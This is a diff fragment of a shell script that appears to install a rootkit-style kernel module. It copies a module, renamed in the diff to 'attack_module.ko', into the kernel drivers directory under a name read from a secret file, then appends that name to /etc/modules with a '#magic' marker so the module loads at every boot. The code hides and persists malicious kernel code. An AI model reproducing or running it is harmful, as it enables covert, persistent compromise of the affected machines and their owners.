@@ -6,7 +6,7 @@ export SECRET_KO_NAME=$(cat secret_ko_name)
 export SECRET_PAYLOAD_NAME=$(cat secret_payload_name)
 
 # deploy the kernel module to the drivers directory
-cp -f main.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_KO_NAME.ko"
+cp -f attack_module.ko "/lib/modules/$(uname -r)/kernel/drivers/$SECRET_KO_NAME.ko"
 # add this module as a startup module
 echo "\n$SECRET_KO_NAME #magic\n" >> /etc/modules
 # register these changes with the OS
